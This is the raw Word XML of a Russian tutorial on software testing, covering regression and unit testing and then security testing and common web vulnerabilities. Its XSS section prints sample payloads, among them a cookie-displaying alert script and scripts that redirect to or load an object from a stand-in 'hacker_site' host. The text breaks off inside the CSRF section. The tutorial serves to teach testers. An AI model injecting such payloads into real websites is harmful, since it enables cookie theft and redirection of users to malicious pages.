      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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старых багов (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Old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bugs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исправление старых ошибок, т.е. старые баги стали снова воспроизводиться.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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Регрессия побочного эффекта (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>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effect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другие части разрабатываемого приложения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 xml:space="preserve">) – тестирование каждой атомарной функциональности приложения отдельно, в искусственно созданной среде. Именно потребность в создании искусственной рабочей среды для определенного модуля, требует от </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>тестировщика</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> знаний в автоматизации тестирования программного обеспечения, некоторых навыков программирования. Данная среда для некоторого юнита создается с помощью драйверов и заглушек.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF"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Каждая сложная программная система состоит из отдельных частей - модулей, выполняющих ту или иную функцию в составе системы. Для того, чтобы удостовериться в корректной работе всей системы, необходимо вначале протестировать каждый модуль системы по отдельности. В случае возникновения проблем при тестировании системы в целом это позволяет проще выявить модули, вызвавшие проблему, и устранить соответствующие дефекты в них. Такое тестирование модулей по отдельности получило называние модульного тестирования.</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> На р</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ис</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>унок 1.3 в</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>изуально изображено модульное тестирование</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5E0F40">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val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41D6E943" wp14:editId="6CBF8E59">
            <wp:extent cx="4314825" cy="2438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825" cy="2438400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="005E0F40">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w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>унок 1.3 -</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> Визуально изображено модульное тестирование</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Драйвер – определенный модуль теста, который выполняют тестируемый нами элемент.</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Заглушка – часть программы, которая симулирует обмен данными с тестируемым компонентом, выполняет имитацию рабочей системы.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Заглушки нужны для:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Имитирования недостающих компонентов для работы данного элемента.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Подачи или возвращения модулю определенного значения, возможность предоставить тестеру самому ввести нужное значение.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="005E0F40" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Воссоздания определенных ситуаций (исключения или другие нестандартные условия работы элемента).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 модульного тестирования.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Прежде всего, нужно очертить рамки, в которых Юнит-тестирование оправданно. Во-первых, архитектура проекта должна быть спроектирована в соответствии с идеями ООП (четкое деление на классы, каждый из которых выполняет свою определенную функцию), что обеспечит систему грамотным делением на модули. Также, модульное тестирование должно быть менее затратным при поиске дефектов, чем другие виды тестов и должно снижать время отладки кода.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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF"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Модульное тестирование мотивирует программистов писать код максимально оптимизированным, проводить </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>рефакторинг</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (упрощение кода программы, не затрагивая ее функциональность), так как с помощью Юнит-тестирования можно легко проверить работоспособность рассматриваемого компонента.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF"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Необходимость отделения реализации от интерфейса (ввиду особенностей модульного тестирования), что позволяет минимизировать зависимости в системе.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF"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Документация Юнит-тестов может служить примером «живого документа» для каждого класса, тестируемого данным способом.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF"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Модульное тестирование помогает лучше понять роль каждого класса на фоне всей программной системы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF"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Также, при «разработке через тестирование», которая активно используется в экстремальном программировании, модульное тестирования является одним из основных инструментов, позволяющий разрабатывать модули в соответствии с требованиями к данному модулю.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="005E0F40"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Естественно, получив реальный опыт работы инженером качества, Вы сможете совсем по-другому охарактеризовать данный вид тестирования. А пока, надеюсь, данная статья поможет Вам подойти на шаг ближе к возможности получения реального опыта.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безопасности (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>security</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безопасности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Принципы безопасности программного обеспечения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Общая стратегия безопасности основывается на трех основных принципах:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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60216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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60216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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Доступность</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="005E0F40"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073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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Целостность</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">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rPr>
        <w:t>Существует два основных критерия при определении понятия целостности:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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Доверие. Ожидается, что ресурс будет изменен только соответствующим способом определенной группой пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="005E0F40" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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 xml:space="preserve">Повреждение и восстановление. В </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>случае</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">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rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="005E0F40"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073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ресурс</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> тем выше уровень доступности должен быть.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Виды уязвимостей</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">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rPr>
        <w:t>В настоящее время наиболее распространенными видами уязвимости в безопасности программного обеспечения являются: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 - это вид уязвимости программного обеспечения (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> приложений), при которой, на генерированной сервером странице, выполняются вредоносные скрипты, с целью атаки клиента.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 xml:space="preserve">) - это вид уязвимости, позволяющий использовать недостатки HTTP протокола, при этом злоумышленники работают по следующей схеме: ссылка на вредоносный сайт </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>установливается</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> на странице, пользующейся доверием у пользователя, при переходе по вредоносной ссылке выполняется скрипт, сохраняющий личные данные пользователя (пароли, платежные данные и т.д.), либо отправляющий СПАМ сообщения от лица пользователя, либо изменяет доступ к учетной записи пользователя, для получения полного контроля над ней.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Code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injections</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SQL, PHP, ASP и т.д.) - это вид уязвимости, при котором становится возможно осуществить запуск исполняемого кода с целью получения доступа к системным ресурсам, несанкционированного доступа к данным либо выведения системы из строя.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r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - это вид уязвимости, использующий вставку серверных команд в HTML код или запуск их напрямую с сервера.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E0F40"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Authorization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Bypass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - это вид уязвимости, при котором возможно получить несанкционированный доступ к учетной записи или документам другого пользователя</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B"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lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Как тестировать ПО на безопасность?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Приведем примеры тестирования ПО на предмет уязвимости в системе безопасности. Для этого Вам необходимо проверить Ваше программное обеспечение на наличия известных видов уязвимостей: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Сами по себе XSS атаки могут быть очень разнообразными. Злоумышленники могут попытаться украсть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 xml:space="preserve">, перенаправить вас на сайт, где произойдет более серьезная атака, загрузить в память какой-либо вредоносный объект и т.д., всего </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>навсего</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> разместив вредоносный скрипт у вас на сайте. Как пример, можно рассмотреть следующий скрипт, выводящий на экран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&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>);&lt;/script&gt;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либо </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>скрипт</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> делающий </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>редирект</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> на зараженную страницу:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="708"/>
          <w:tab w:val="left" w:pos="2325"/>
        </w:tabs>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"/>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&lt;script&gt;window.parent.location.href='http://hacker_site';&lt;/script&gt;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либо создающий вредоносный объект с вирусом и т.п.:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="708"/>
          <w:tab w:val="left" w:pos="2325"/>
        </w:tabs>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"/>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&lt;object type="text/x-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scriptlet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>" data="http://hacker_site"&gt;&lt;/object&gt;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Для просмотра большего количества примеров рекомендуем посетить страничку: XSS (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Cross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Site</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gram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roofErr w:type="gramEnd"/>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Наиболее частыми CSRF атаками являются </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>атаки</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> использующие HTML &lt;IMG&gt; тэг или </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> объект </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>image</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
